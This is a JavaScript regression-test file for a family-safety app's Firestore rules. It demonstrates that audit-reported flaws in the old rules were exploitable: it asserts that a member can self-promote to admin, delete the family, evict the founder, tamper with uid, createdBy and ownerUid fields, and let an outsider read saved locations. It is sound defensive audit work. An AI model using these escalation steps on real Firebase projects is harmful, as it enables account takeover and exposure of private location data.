// Theeram — demonstration that the PRE-FIX production rules were exploitable.
//
// This file runs the same attacks as rules.test.mjs, but against the frozen
// pre-fix baseline in tests/fixtures/pre-fix.rules (byte-identical to what was
// live in project theeram-18e35 at the time of the audit).
//
// Every test here asserts that the attack SUCCEEDS. That is the point: it is
// evidence the vulnerabilities were real, not theoretical. If a test in this
// file ever starts failing, the fixture has been altered — do not "fix" it.
//
// The corresponding tests in rules.test.mjs assert the same attacks now FAIL.

import { test, before, after, beforeEach, describe } from 'node:test';
import { assertSucceeds } from '@firebase/rules-unit-testing';
import { doc, getDoc, updateDoc, deleteDoc, setDoc } from 'firebase/firestore';
import { makeTestEnv, seed, as, F1 } from './helpers.mjs';

const PRE_FIX_RULES = new URL('./fixtures/pre-fix.rules', import.meta.url).pathname;

let env;
before(async () => { env = await makeTestEnv(PRE_FIX_RULES, 'demo-theeram-prefix'); });
after(async () => { if (env) await env.cleanup(); });
beforeEach(async () => { await seed(env); });

describe('PRE-FIX baseline — confirming the reported vulnerabilities were real', () => {
  test('V1 (CRITICAL): a plain member CAN promote themselves to admin', async () => {
    await assertSucceeds(
      updateDoc(doc(as(env, 'bob'), 'families', F1, 'members', 'bob'), { role: 'admin' })
    );
  });

  test('V1 escalation chain: self-promoted member CAN then delete the family', async () => {
    await updateDoc(doc(as(env, 'bob'), 'families', F1, 'members', 'bob'), { role: 'admin' });
    await assertSucceeds(deleteDoc(doc(as(env, 'bob'), 'families', F1)));
  });

  test('V1 escalation chain: self-promoted member CAN evict the real founder', async () => {
    await updateDoc(doc(as(env, 'bob'), 'families', F1, 'members', 'bob'), { role: 'admin' });
    await assertSucceeds(deleteDoc(doc(as(env, 'bob'), 'families', F1, 'members', 'alice')));
  });

  test('V1 escalation chain: self-promoted member CAN edit another member location', async () => {
    await updateDoc(doc(as(env, 'bob'), 'families', F1, 'members', 'bob'), { role: 'admin' });
    await assertSucceeds(
      updateDoc(doc(as(env, 'bob'), 'families', F1, 'locations', 'locAlice'), { name: 'Hijacked' })
    );
  });

  test('V2 (MEDIUM): a member CAN overwrite the uid field on their own doc', async () => {
    await assertSucceeds(
      updateDoc(doc(as(env, 'bob'), 'families', F1, 'members', 'bob'), { uid: 'carol' })
    );
  });

  test('V3 (MEDIUM): an admin CAN rewrite createdBy on the family document', async () => {
    await assertSucceeds(
      updateDoc(doc(as(env, 'alice'), 'families', F1), { createdBy: 'erin' })
    );
  });

  test('V3 chain: after createdBy is rewritten, that outsider CAN self-insert as admin', async () => {
    await updateDoc(doc(as(env, 'alice'), 'families', F1), { createdBy: 'erin' });
    await assertSucceeds(
      setDoc(doc(as(env, 'erin'), 'families', F1, 'members', 'erin'), {
        uid: 'erin', role: 'admin', status: 'safe', name: 'Erin'
      })
    );
    // ...and that outsider can now read every saved location in the family.
    await assertSucceeds(getDoc(doc(as(env, 'erin'), 'families', F1, 'locations', 'locAlice')));
  });

  test('V5 (LOW-MED): a location owner CAN reassign ownerUid to another member', async () => {
    await assertSucceeds(
      updateDoc(doc(as(env, 'bob'), 'families', F1, 'locations', 'locBob'), { ownerUid: 'carol' })
    );
  });
});
